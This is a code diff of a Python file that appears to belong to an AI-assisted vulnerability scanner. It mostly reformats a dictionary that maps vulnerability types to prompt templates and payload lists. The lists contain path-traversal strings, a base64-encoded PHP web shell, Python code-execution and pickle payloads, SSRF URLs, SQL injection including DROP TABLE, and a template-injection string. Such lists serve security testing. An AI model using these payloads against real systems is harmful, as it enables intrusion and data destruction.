@@ -222,26 +222,25 @@ When analyzing, consider:
 VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
     "LFI": {
         "prompt": LFI_TEMPLATE,
-        "bypasses" : [
+        "bypasses": [
             "../../../../etc/passwd",
             "/proc/self/environ",
             "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
             "file:///etc/passwd",
-            "C:\\win.ini"
-            "/?../../../../../../../etc/passwd"
-        ]
+            "C:\\win.ini/?../../../../../../../etc/passwd",
+        ],
     },
     "RCE": {
         "prompt": RCE_TEMPLATE,
-        "bypasses" : [
+        "bypasses": [
             "__import__('os').system('id')",
             "eval('__import__(\\'os\\').popen(\\'id\\').read()')",
             "exec('import subprocess;print(subprocess.check_output([\\'id\\']))')",
             "globals()['__builtins__'].__import__('os').system('id')",
             "getattr(__import__('os'), 'system')('id')",
             "$(touch${IFS}/tmp/mcinerney)",
-            "import pickle; pickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')"
-        ]
+            "import pickle; pickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')",
+        ],
     },
     "SSRF": {
         "prompt": SSRF_TEMPLATE,
@@ -250,8 +249,8 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "file:///etc/passwd",
             "dict://127.0.0.1:11211/",
             "ftp://anonymous:anonymous@127.0.0.1:21",
-            "gopher://127.0.0.1:9000/_GET /"
-        ]
+            "gopher://127.0.0.1:9000/_GET /",
+        ],
     },
     "AFO": {
         "prompt": AFO_TEMPLATE,
@@ -260,8 +259,8 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "shell.py;.jpg",
             ".htaccess",
             "/proc/self/cmdline",
-            "../../config.py/."
-        ]
+            "../../config.py/.",
+        ],
     },
     "SQLI": {
         "prompt": SQLI_TEMPLATE,
@@ -270,8 +269,8 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "1 OR 1=1--",
             "admin'--",
             "1; DROP TABLE users--",
-            "' OR '1'='1"
-        ]
+            "' OR '1'='1",
+        ],
     },
     "XSS": {
         "prompt": XSS_TEMPLATE,
@@ -280,13 +279,10 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "${7*7}",
             "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{%endif%}{% endfor %}",
             "<script>alert(document.domain)</script>",
-            "javascript:alert(1)"
-        ]
+            "javascript:alert(1)",
+        ],
     },
-    "IDOR": {
-        "prompt": IDOR_TEMPLATE,
-        "bypasses": []
-    }
+    "IDOR": {"prompt": IDOR_TEMPLATE, "bypasses": []},
 }
 
 INITIAL_ANALYSIS_PROMPT_TEMPLATE = """
